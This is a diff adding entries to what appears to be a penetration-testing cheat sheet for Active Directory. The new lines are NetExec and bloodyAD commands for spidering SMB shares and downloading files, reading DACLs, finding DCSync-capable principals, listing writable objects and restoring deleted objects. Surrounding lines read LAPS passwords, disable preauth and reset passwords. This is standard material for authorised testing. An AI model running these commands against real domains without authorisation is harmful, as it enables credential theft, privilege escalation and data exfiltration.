@@ -1583,6 +1583,7 @@ nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --tasklist                      
 # SMB spider / files / execution
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --spider-folder Users --pattern password       # search share names
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --regex ".*\\.txt$" --content                  # regex and content search
+nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true                       # recursive SMB spidering and download discovered files
 # Use faketime when local clock skew breaks auth; DOWNLOAD_FLAG saves discovered files and OUTPUT_FOLDER=. writes them under the current directory.
 faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.    # recursive SMB spidering with downloads
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file "\\Windows\\Temp\\file.txt" ./file.txt          # download file
@@ -1636,6 +1637,12 @@ nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker                   
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M maq                                              # MachineAccountQuota
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts                                      # enumerate trusts
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc                                        # inspect user descriptions
+nxc ldap <DC_FQDN> -k --kdcHost <DC_FQDN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read       # read all ACEs on a target object with Kerberos
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read                  # read all ACEs on target object
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read PRINCIPAL=<USER>    # read rights a principal has on target
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<TLD>" ACTION=read RIGHTS=DCSync    # find principals with DCSync rights
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=<TARGET_OBJECT> ACTION=read ACE_TYPE=denied    # read denied ACEs on target
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -M daclread -o TARGET=targets.txt ACTION=backup                     # backup DACLs for target list
 
 # WinRM / WMI / RDP
 nxc winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>                          # test WinRM credentials
@@ -1712,6 +1719,7 @@ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass    # PsExec using Kerber
 
 ```bash
 # GET
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get writable                                      # list objects/attributes the current user can modify
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<TLD>' --type user                       # list domain user objects
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<TLD>' --attr ms-DS-MachineAccountQuota    # read MAQ value
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                      # read LAPS password
@@ -1723,6 +1731,7 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember 
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH       # disable preauth requirement
 
 # SET
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' set restore 'CN=<NAME>\0ADEL:<OBJECT_GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'    # restore deleted AD object; use exact tombstone DN
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'    # set AD user password
 ```
 
